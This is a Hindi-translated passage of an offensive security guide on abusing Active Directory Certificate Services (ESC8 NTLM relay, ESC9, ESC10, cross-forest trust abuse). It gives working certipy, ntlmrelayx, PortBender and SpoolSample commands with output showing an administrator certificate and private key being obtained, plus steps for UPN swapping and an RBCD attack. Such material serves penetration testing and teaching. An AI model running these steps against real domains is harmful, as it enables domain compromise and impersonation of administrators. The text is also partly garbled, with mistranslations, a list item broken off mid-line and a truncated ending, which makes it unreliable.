अपने **`Manage CA` और `Manage Certificates`** के साथ, हम फिर `ca` कमांड और `-issue-request <request ID>` पैरामीटर के साथ **विफल प्रमाणपत्र** अनुरोध जारी कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
और अंत में, हम `req` कमांड और `-retrieve <request ID>` पैरामीटर के साथ **जारी प्रमाणपत्र को पुनः प्राप्त कर सकते हैं**।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay से AD CS HTTP अंत-बिंदुओं को उन्नत करना - ESC8

### स्पष्टीकरण

{% hint style="info" %}
सारांश में, यदि किसी पर्यावरण में **AD CS स्थापित है**, साथ ही एक **विकल्पशील वेब नामांकन अंत-बिंदु** और कम से कम एक **प्रमाणपत्र टेम्पलेट प्रकाशित है** जो **डोमेन कंप्यूटर नामांकन और ग्राहक प्रमाणीकरण** की अनुमति देता है (जैसे कि डिफ़ॉल्ट **`Machine`** टेम्पलेट), तो एक **हमलावर किसी भी कंप्यूटर को संक्रमित कर सकता है जिसमें स्पूलर सेवा चल रही हो**!
{% endhint %}

AD CS कई **HTTP आधारित नामांकन विधियों** का समर्थन करता है जिन्हें प्रशासक स्थापित कर सकते हैं। ये HTTP आधारित प्रमाणपत्र नामांकन इंटरफ़ेस सभी **विकल्पशील NTLM रिले हमलों** को समर्थन करते हैं। NTLM रिले का उपयोग करके, एक हमलावर **संक्रमित मशीन पर किसी भी इनबाउंड-NTLM प्रमाणीकरण AD खाते की अनुकरण कर सकता है**। पीड़ित खाता की अनुकरण करते हुए, एक हमलावर इन वेब इंटरफ़ेस का उपयोग कर सकता है और **`User` या `Machine` प्रमाणपत्र टेम्पलेट पर आधारित ग्राहक प्रमाणपत्र का अनुरोध कर सकता है**।

* **वेब नामांकन इंटरफ़ेस** (एक पुराने दिखने वाले ASP एप्लिकेशन जिसे `http://<caserver>/certsrv/` पर पहुँचा जा सकता है), डिफ़ॉल्ट रूप से केवल HTTP का समर्थन करता है, जो NTLM रिले हमलों के खिलाफ सुरक्षा नहीं कर सकता। इसके अलावा, यह व्यक्तिगतता HTTP हैडर के माध्यम से केवल NTLM प्रमाणीकरण की अनुमति देता है, इसलिए केरबेरोस जैसे अधिक सुरक्षित प्रोटोकॉल अप्रयोग्य हो जाते हैं।
* **प्रमाणपत्र नामांकन सेवा** (CES), **प्रमाणपत्र नामांकन नीति** (CEP) वेब सेवा और **नेटवर्क उपकरण नामांकन सेवा** (NDES) डिफ़ॉल्ट रूप से अपने अधिकृतता HTTP हैडर के माध्यम से नेगोटिएट प्रमाणीकरण का समर्थन करते हैं। नेगोटिएट प्रमाणीकरण **केरबेरोस** और **NTLM** का समर्थन करता है; इसलिए, एक हमलावर रिले हमलों के दौरान NTLM प्रमाणीकरण तक नेगोटिएट कर सकता है। ये वेब सेवाएं कम से कम डिफ़ॉल्ट रूप से HTTPS का समर्थन करती हैं, लेकिन दुर्भाग्य से HTTPS स्वयं में NTLM रिले हमलों के खिलाफ सुरक्षा नहीं करता है। केवल जब HTTPS को चैनल बाइंडिंग के साथ जोड़ा जाता है, तब HTTPS सेवाएं NTLM रिले हमलों से सुरक्षित हो सकती हैं। दुर्भाग्य से, AD CS IIS पर विस्तारित सुरक्षा के लिए आवश्यक चैनल बाइंडिंग को सक्षम नहीं करता है।

NTLM रिले हमलों की सामान्य **समस्याएं** यह हैं कि **NTLM सत्र सामान्यतः छोटे होते हैं** और हमलावर **NTLM साइनिंग को प्रयोग करने वाली सेवाओं के साथ संवाद करने में सक्षम नहीं होता है**।

हालांकि, एक NTLM रिले हमले का दुरुपयोग करके उपयोगकर्ता को प्रमाणपत्र प्राप्त करने के लिए यह सीमाएं हल हो जाती हैं, क्योंकि सत्र प्रमाणपत्र मान्य होने तक जीवित रहेगा और प्रमाणपत्र का उपयोग करके **NTLM साइनिंग को प्रयोग करने वाली सेवाओं का उपयोग किया जा सकता है**। चोरी किए गए प्रमाणपत्र का उपयोग कैसे करना है, इसके बारे में जानने के लिए देखें:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLM रिले हमलों की एक और सीमा यह है कि वे **एक पीड़ित खाता को एक हमलावर नियंत्रित मशीन के साथ प्रमाणित करने की आवश्यकता होती है**। एक हमलावर इंतजार कर सकता है या इसे **बाध्य** करने की कोशिश कर सकता है:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **दुरुपयोग**

\*\*\*\*[**Certify**](https://github.com/GhostPack/Certify) के `cas` कमांड से **सक्रिय HTTP AD CS अंत-बिंदुओं की जांच** की जा सकती है:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

एंटरप्राइज CAs अपने AD ऑब्जेक्ट में भी CES एंडपॉइंट्स को संग्रहीत करते हैं `msPKI-Enrollment-Servers` प्रॉपर्टी में। **Certutil.exe** और **PSPKI** इन एंडपॉइंट्स को पार्स करके सूचीबद्ध कर सकते हैं:
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Certify के साथ दुरुपयोग

यह तकनीक Certify टूल का उपयोग करके एक विशेष प्रमाणपत्र के साथ दुरुपयोग करने के बारे में है।
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) के साथ दुरुपयोग

डिफ़ॉल्ट रूप से, Certipy `$` से समाप्त होने वाले खाता नाम पर आधारित `Machine` या `User` टेम्पलेट के आधार पर प्रमाणपत्र का अनुरोध करेगा। हम `-template` पैरामीटर के साथ एक और टेम्पलेट निर्दिष्ट कर सकते हैं।

फिर हम [PetitPotam](https://github.com/ly4k/PetitPotam) जैसी एक तकनीक का उपयोग करके प्रमाणीकरण को बलपूर्वक कर सकते हैं। डोमेन कंट्रोलर्स के लिए, हमें `-template DomainController` निर्दिष्ट करना चाहिए।
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## कोई सुरक्षा विस्तार - ESC9 <a href="#5485" id="5485"></a>

### स्पष्टीकरण

ESC9 नए **`msPKI-Enrollment-Flag`** मान **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) को संदर्भित करता है। यदि इस फ्लैग को प्रमाणपत्र टेम्पलेट पर सेट किया जाता है, तो **नई `szOID_NTDS_CA_SECURITY_EXT` सुरक्षा विस्तार** एम्बेड नहीं किया जाएगा। ESC9 केवल तब उपयोगी होता है जब `StrongCertificateBindingEnforcement` को `1` (डिफ़ॉल्ट) पर सेट किया जाता है, क्योंकि केरबेरोस या स्कैनल के लिए एक कमजोर प्रमाणपत्र मैपिंग कॉन्फ़िगरेशन का दुरुपयोग किया जा सकता है जैसा कि ESC10 के रूप में होगा - ESC9 के बिना - क्योंकि आवश्यकताएं समान होंगी।

* `StrongCertificateBindingEnforcement` को `2` (डिफ़ॉल्ट: `1`) पर सेट नहीं किया गया है या `CertificateMappingMethods` में `UPN` फ़्लैग शामिल है
* प्रमाणपत्र में `msPKI-Enrollment-Flag` मान में `CT_FLAG_NO_SECURITY_EXTENSION` फ़्लैग है
* प्रमाणपत्र में कोई भी क्लाइंट प्रमाणीकरण EKU निर्दिष्ट करता है
* किसी खाते A पर `GenericWrite` कोई खाता B को संक्रमित करने के लिए

### दुरुपयोग

इस मामले में, `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` है, और हम `Administrator@corp.local` को संक्रमित करना चाहते हैं। `Jane@corp.local` को प्रमाणपत्र टेम्पलेट `ESC9` में नामित करने की अनुमति है जो `msPKI-Enrollment-Flag` मान में `CT_FLAG_NO_SECURITY_EXTENSION` फ़्लैग निर्दिष्ट करता है।

सबसे पहले, हम `Jane` के हैश को उदाहरण के रूप में शैडो क्रेडेंशियल का उपयोग करके प्राप्त करते हैं (हमारे `GenericWrite` का उपयोग करके)।

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

अगले, हम `Jane` के `userPrincipalName` को `Administrator` बनाते हैं। ध्यान दें कि हम `@corp.local` भाग को छोड़ रहे हैं।

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

यह एक प्रतिबंध उल्लंघन नहीं है, क्योंकि `Administrator` उपयोगकर्ता का `userPrincipalName` `Administrator@corp.local` है और न कि `Administrator`।

अब, हम `Jane` के रूप में प्रभावित प्रमाणपत्र टेम्पलेट `ESC9` का अनुरोध करते हैं। हमें प्रमाणपत्र को `Jane` के रूप में अनुरोध करना होगा।

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि प्रमाणपत्र में `userPrincipalName` `Administrator` है और जारी प्रमाणपत्र में कोई "ऑब्जेक्ट SID" नहीं है।

फिर, हम `Jane` के `userPrincipalName` को कुछ और, जैसे उसके मूल `userPrincipalName` `Jane@corp.local`, में बदलते हैं।

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

अब, यदि हम प्रमाणपत्र के साथ प्रमाणित करने का प्रयास करें, तो हमें `Administrator@corp.local` उपयोगकर्ता का एनटी हैश प्राप्त होगा। प्रमाणपत्र में कोई डोमेन निर्दिष्ट नहीं होने के कारण अपनी कमांड लाइन में `-domain <domain>` जोड़ने की आवश्यकता होगी।

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## कमजोर प्रमाणपत्र मैपिंग - ESC10

### स्पष्टीकरण

ESC10 नियंत्रक प्रमाणपत्र पर दो रजिस्ट्री कुंजी मानों को संदर्भित करता है।

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`। डिफ़ॉल्ट मान `0x18` (`0x8 | 0x10`), पहले `0x1F`।

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`। डिफ़ॉल्ट मान `1`, पहले `0`।

**मामला 1**

`StrongCertificateBindingEnforcement` को `0` पर सेट किया गया है

**मामला 2**

`CertificateMappingMethods` में `UPN` बिट (`0x4`) शामिल है

### दुरुपयोग मामला 1

* `StrongCertificateBindingEnforcement` को `0` पर सेट किया गया है
* `
तब हम `Jane` के `userPrincipalName` को वापस बदलते हैं और उसे कुछ और बनाते हैं, जैसे कि उसका मूल `userPrincipalName` (`Jane@corp.local`)।

<figure><img src="../../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

अब, क्योंकि यह रजिस्ट्री की चाबी Schannel के लिए लागू होती है, हमें Schannel के माध्यम से प्रमाणीकरण के लिए प्रमाणपत्र का उपयोग करना होगा। यहां Certipy का नया `-ldap-shell` विकल्प उपयोग में आता है।

यदि हम प्रमाणपत्र और `-ldap-shell` के साथ प्रमाणित करने का प्रयास करें, तो हम देखेंगे कि हम `u:CORP\DC$` के रूप में प्रमाणित हो रहे हैं। यह एक स्ट्रिंग है जो सर्वर द्वारा भेजा जाता है।

<figure><img src="../../../.gitbook/assets/image (21) (2) (1).png" alt=""><figcaption></figcaption></figure>

LDAP शैल के लिए उपलब्ध आपत्ति में से एक `set_rbcd` है, जो लक्ष्य पर संसाधित संसाधन-आधारित सीमित अधिरोहण (RBCD) सेट करेगा। इसलिए हम डोमेन कंट्रोलर को प्रभावित करने के लिए एक RBCD हमला कर सकते हैं।

<figure><img src="../../../.gitbook/assets/image (7) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

वैकल्पिक रूप से, हम किसी भी उपयोगकर्ता खाते को भी प्रभावित कर सकते हैं जहां `userPrincipalName` सेट नहीं है या जहां `userPrincipalName` उस खाते के `sAMAccountName` से मेल नहीं खाता। मेरे खुद के परीक्षण से, डिफ़ॉल्ट डोमेन प्रशासक `Administrator@corp.local` के पास डिफ़ॉल्ट रूप से `userPrincipalName` सेट नहीं होता है, और इस खाते के पास डिफ़ॉल्ट रूप से LDAP में डोमेन कंट्रोलर से अधिक अधिकार होने चाहिए।

## प्रमाणपत्रों के माध्यम से वनस्पतियों को प्रभावित करना

### सीए विश्वास वनस्पति ट्रस्ट तोड़ना

**क्रॉस-वनस्पति पंजीकरण** के लिए सेटअप अपेक्षाकृत सरल है। प्रशासक संसाधन वनस्पति के **रूट सीए प्रमाणपत्र** को **खाता वनस्पतियों** में प्रकाशित करते हैं और संसाधन वनस्पति के **एंटरप्राइज सीए** प्रमाणपत्रों को प्रत्येक खाता वनस्पति के **`NTAuthCertificates`** और AIA कंटेनर में जोड़ते हैं। स्पष्ट होने के लिए, इसका अर्थ है कि **संसाधन वनस्पति में सीए** को **उन सभी वनस्पतियों पर प्रबंधन का पूर्ण नियंत्रण** होता है जिनके लिए वह पीकेआई व्यवस्था करता है। यदि हमलावार **इस सीए को प्रभावित करते हैं**, तो हम **संसाधन और खाता वनस्पतियों में सभी उपयोगकर्ताओं के लिए प्रमाणपत्र जाली बना सकते हैं**, वनस्पति सुरक्षा सीमा को तोड़ते हुए।

### पंजीकरण अधिकार वाले विदेशी प्रमुख

बहु-वनस्पति पर्यावरणों में संगठनों को सतर्क रहने की एक और बात है एंटरप्राइज सीए द्वारा प्रकाशित प्रमाणपत्र टेम्पलेट्स हैं जो **प्रमाणित उपयोगकर्ताओं या विदेशी प्रमुखों** (वनस्पति से बाहरी उपयोगकर्ता/समूह) को **पंजीकरण और संपादन अधिकार** प्रदान करते हैं।\
जब एक खाता **विश्वास पर प्रमाणित होता है**, तो AD उपयोगकर्ता के टोकन में **प्रमाणित उपयोगकर्ता SID** को जोड़ता है। इसलिए, यदि किसी डोमेन में एक एंटरप्राइज सीए होती है जिसमें एक टेम्पलेट है जो **प्रमाणित उपयोगकर्ताओं को पंजीकरण अधिकार प्रदान करती है**, तो एक अलग वनस्पति में एक उपयोगकर्ता पंजीकरण कर सकता है। उसी तरह, यदि एक टेम्पलेट विशेष रूप से **विदेशी प्रमुख को पंजीकरण अधिकार प्रदान करती है**, तो एक **क्रॉस-वनस्पति पहुँच-नियंत्रण संबंध बनाया जाता है**, जो एक वनस्पति में एक प्रमुख को दूसरी वनस्पति में एक टेम्पलेट में पंजीकरण करने की अनुमति देता है।

अंततः, दोनों स्थितियाँ एक वनस्पति से दूसरी वनस्पति की ओर से हमले की सतह बढ़ाती हैं। प्रमाणपत्र टेम्पलेट सेटिंग्स के आधार पर, एक हमलावर इसे एक विदेशी डोमेन में अतिरिक्त अधिकार प्राप्त करने के लिए इसका दुरुपयोग कर सकता है।

## संदर्भ

* इस पृष्ठ की सभी जानकारी [https://www.spect
